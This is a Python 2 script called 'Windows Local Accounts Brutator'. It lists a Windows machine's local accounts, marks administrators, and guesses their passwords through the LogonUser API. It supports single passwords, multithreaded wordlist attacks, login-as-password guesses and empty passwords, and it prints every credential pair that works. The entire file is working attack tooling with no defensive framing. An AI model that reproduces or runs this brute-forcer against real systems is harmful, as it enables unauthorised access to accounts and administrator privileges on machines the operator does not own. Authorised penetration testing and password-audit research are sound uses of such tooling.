import sys
import os
from optparse import OptionParser
import win32api
import win32net
import win32security
from _winreg import *
import colorama
import threading
from Queue import Queue
import time
import signal
from progressbar import Bar, ProgressBar, Percentage

MAX_THREADS = 15

def banner():
	print colorama.Style.BRIGHT
	print '===================================================================='
	print '                    Windows Local Accounts Brutator                 '
	print '                          ! BANG BANG !                             '
	print '===================================================================='
	print colorama.Style.RESET_ALL
	return
	
def displaySummary():
	print 'Summary'
	print '-------'
	if len(founds) == 0:
		print_fail('[-] No valid local account has been found !')
	else:
		print_success('[+] %d valid local account(s) found:' % len(founds))
		for u in founds:
			print '  %s / %s' % (u, founds[u])
	return

def signal_handler(signal, frame):
	print
	print 'Exiting...'
	print
	os._exit(1)
	for i in range(MAX_THREADS*10):
		queue.put(None)
	#sys.exit(0)
	
	
def print_success(str):
	print colorama.Style.BRIGHT + colorama.Fore.GREEN + str + colorama.Fore.RESET + colorama.Style.RESET_ALL
	return

def print_fail(str):
	print colorama.Style.BRIGHT + colorama.Fore.RED + str + colorama.Fore.RESET + colorama.Style.RESET_ALL
	return
	
def print_yellow(str):
	print colorama.Style.BRIGHT + colorama.Fore.YELLOW + str + colorama.Fore.RESET + colorama.Style.RESET_ALL
	return
	
def listLocalUsers():
	try:
		users = win32net.NetUserEnum('localhost', 0)
	except:
		print_fail('[!] Error with NetUserEnum API call, cannot list users')
		#print win32api.GetLastError()
		return None
	usernames = []
	print 'Local User Accounts (with Local Groups)'
	print '---------------------------------------'
	for user in users[0]:
		usernames.append(user['name'])
		groups = win32net.NetUserGetLocalGroups(None, user['name'], 0)
		if 'Administrators' in groups or 'Administrateurs' in groups:
			print_yellow('  %s [%s]' % (user['name'], '-'.join(groups)))
		else:
			print '  %s [%s]' % (user['name'], '-'.join(groups))
	print
	return usernames

def checkCreds(username, password, verbose=True):
	try:
		handle = win32security.LogonUser(username, None, password, win32security.LOGON32_LOGON_NETWORK, win32security.LOGON32_PROVIDER_DEFAULT)
	except win32security.error:
		if verbose:
			print '[-] %s / %s   Invalid' % (username, password)
			pass
		return False
	else:
		if verbose:
			print_success('[+] %s / %s   Valid account found' % (username, password))
		founds[username] = password #unicode(password, encoding="cp1252")
		return True
		
def consumer():
	while True:
		try:
			item = queue.get()
			if item is None:
				break
			(username, password, verbose) = item
			checkCreds(username, password, False)
		except Queue.Empty:
			pass
		finally:
			queue.task_done()
		

def main():
	banner()
	
	# Parse params
	parser = OptionParser('Usage: %prog [-u] [-l <login>|-L <file>] [-p <pass>|-P <file>] [-t <threads>] [-e] [-n] [-v]')
	parser.add_option('-u', action='store_true', dest='justusers',help='Just display local accounts usernames')
	parser.add_option('-l', type='string', dest='login', 		  help='Single username')
	parser.add_option('-L', type='string', dest='loginsfile', 	  help='File containing usernames')
	parser.add_option('-A', action='store_true', dest='bfall',    help='Attack all local accounts')
	parser.add_option('-p', type='string', dest='password',		  help='Single password')
	parser.add_option('-P', type='string', dest='passwordsfile',  help='File containing passwords to try')
	parser.add_option('-e', action='store_true', dest='equal',    help='Test login == password for each entry')
	parser.add_option('-n', action='store_true', dest='pempty',   help='Test empty password')
	parser.add_option('-t', type='int', dest='nbthreads',	      help='Number of threads (default: 5, max: 15)')
	parser.add_option('-v', action='store_true', dest='verbose',  help='Verbose mode - display summary when over')
	(options, args) = parser.parse_args()
	if options.justusers:
		listLocalUsers();
		return
		
	if not (bool(options.login) ^ bool(options.loginsfile) ^ bool(options.bfall)) or  \
	   not (bool(options.password) ^ bool(options.passwordsfile)):
		parser.error('-l/-L/-A and -p/-P must be providden to start an attack')
		sys.exit(1)
	
	if not options.nbthreads or options.nbthreads <= 0:
		options.nbthreads = 5
	elif options.nbthreads > MAX_THREADS:
		options.nbthreads = MAX_THREADS
	if not options.verbose:
		options.verbose = False
	if not options.pempty:
		options.pempty = False
	
	local_users = listLocalUsers()
	if not local_users:
		sys.exit(1)
	
	time.sleep(1)

	# Check files if specified
	if options.loginsfile:
		try:
			loginsfile = open(options.loginsfile, 'r')
		except:
			print_fail('[!] Unable to open logins file')
			sys.exit(1)
		logins = loginsfile.readlines()
	elif options.bfall:
		valid_logins = local_users
	else:
		logins = [options.login]
		
	if options.passwordsfile:
		try:
			passwordsfile = open(options.passwordsfile, 'r')
			num_lines = sum(1 for line in passwordsfile)
		except:
			print_fail('[!] Unable to open passwords file')
			sys.exit(1)
		passwordsfile.close()
		
	# First, verify that usernames are valid...	
	if not options.bfall:
		valid_logins = []
		for login in logins:
			l = unicode(login, encoding="cp1252").strip('\r\n')
			if l not in local_users:
				print_fail(u'[!] %s is not a valid username, will be skipped' % l)
			else:
				valid_logins.append(l)
				
		if not valid_logins:
			print_fail('[!] No valid username to bruteforce, exit...')
			sys.exit(1)
		nb_logins = len(valid_logins)
		time.sleep(1)
		print
	
	# Start bruteforce (handle large passwords lists)
	start_time = time.time()
	# -- single password
	if options.password:
		print 'Single password check mode'
		print '--------------------------'
		password = unicode(options.password, encoding="cp1252")
		for login in valid_logins:
			checkCreds(login, password, True)
			if login not in founds and options.equal:
				checkCreds(login, login, True)
			if login not in founds and options.pempty:
				checkCreds(login, '', True) 
				
	# -- passwords list
	else:
		print 'Dictionnary attack'
		print '------------------'
		print 'Wordlist length: %d words' % num_lines
		print 'Start bruteforce with %d threads...' % options.nbthreads
		print 
		# Create threads
		for i in range(options.nbthreads):
			t = threading.Thread(target=consumer)
			t.start()
			#gevent.spawn(consumer)

		for login in valid_logins:
			print '[~] Login: %s' % login
			
			i = 0
			with open(options.passwordsfile) as f:
				progress = ProgressBar(widgets=[Percentage(), Bar('=', '[', ']')], maxval=num_lines+2).start()
				if options.equal:
					queue.put((login, login, options.verbose))
					i += 1
				if options.pempty:
					queue.put((login, '', options.verbose))
					i += 1
				for p in f:
					try:
						p = unicode(p, encoding="cp1252")
					except:
						pass
					finally:
						if login in founds:
							progress.finish()
							print_success('[+] %s / %s   Valid account found' % (login, founds[login]))
							break
						queue.put((login, p.strip('\r\n'), options.verbose))
						i += 1
						progress.update(i)
				progress.finish()
			time.sleep(1)
		finished = True
		
		# Terminate consumers
		for i in range(options.nbthreads):
			queue.put(None)
		queue.join()
		
	# Summary
	if options.verbose:
		print
		displaySummary()
	print
	print 'Elapsed time: ' + str(time.time() - start_time) + 's'

	return


if __name__ == "__main__":
	colorama.init()
	founds = {}
	finished = False
	queue = Queue()
	signal.signal(signal.SIGINT, signal_handler)
	main()